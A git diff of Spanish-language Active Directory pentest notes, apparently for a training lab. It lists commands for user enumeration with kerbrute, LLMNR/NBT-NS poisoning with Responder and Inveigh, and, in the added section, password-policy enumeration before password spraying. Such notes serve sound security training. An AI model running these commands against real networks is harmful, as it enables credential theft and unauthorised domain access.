@@ -25,6 +25,7 @@ Ejemplo de busqueda
 Archvios	-> filetype:pdf inurl:<domain>
 Mails		-> intext:"@dominio" inurl:<dominio>
 
+----------	----------	----------	----------
 	### Enumeracion inicial
 ## Enumeracion pasiva
 sudo -E wireshark
@@ -45,6 +46,7 @@ sudo make all
 kerbrute userenum -d DOMINIO.LOCAL --dc <IP_dc> <user dic txt> -o valid_ad_users
 #Enumeracion de usuarios contra el DC
 
+----------	----------	----------	----------
 	### Enumeracion activa
 ## LLMNR/NBT-NS Poisioning desde Linux
 responder -I <adaptador de red>
@@ -60,3 +62,31 @@ Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 .\Inveigh.exe
 #Si se usa el tool ya compilado en C#, se lo ejecuta y corre en default
 Con la tecla esc se puede salir de la consola y tipear HELP para que se nos muestra la ayuda con los comandos y cosas para habilitar
+
+----------	----------	----------	----------
+	### Password spraying
+Consta del intento de loguearse a un servicio mediante el uso de una contraseña pero una larga lista de usuarios
+
+## Obtener politica de contraseñas Linux
+crackmapexec smb 172.16.5.5 -u <usuario valido> -p <contraseña valida> --pass-pol
+#Enumeracion de politica de contraseñas con credenciales validas
+
+rpcclient -U "" -N 172.16.5.5
+getdompwinfo
+#Enumeracion de la politica de contraseñas sin credenciales validas pero con null sesion
+
+enum4linux -P 172.16.5.5
+#Tool de enumeracion el cual prueba diferentes sesiones, busca politicas de contraseñas, etc.
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+#Escrito en python. Este permite exportar la data
+
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+#En configuraciones viejas de ldap es posible retrive data sin auth. De esta forma se soliciat la politica de pwd
+
+## Obtener politica de contraseñas Windows
+net accounts
+#En CMD. Devuelve info de la poltica como longitud, cata cuanto expira, intento maximos antes de ser bloqueado, etc.
+
+import-module .\PowerView.ps1
+Get-DomainPolicy
+#Lo mismo que mas arriba pero con powershell
